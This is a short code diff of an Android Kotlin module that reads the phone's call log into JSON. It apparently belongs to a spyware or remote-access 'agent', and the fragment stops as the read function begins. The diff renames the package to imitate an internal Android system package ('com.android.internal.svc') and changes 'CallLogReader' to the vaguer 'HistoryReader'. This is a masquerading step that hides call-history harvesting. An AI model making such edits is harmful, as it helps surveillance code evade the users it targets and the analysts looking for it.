@@ -1,11 +1,11 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.content.Context
 import android.provider.CallLog
 import org.json.JSONArray
 import org.json.JSONObject
 
-class CallLogReader(private val context: Context) {
+class HistoryReader(private val context: Context) {
 
     fun read(): JSONObject {
         val calls = JSONArray()
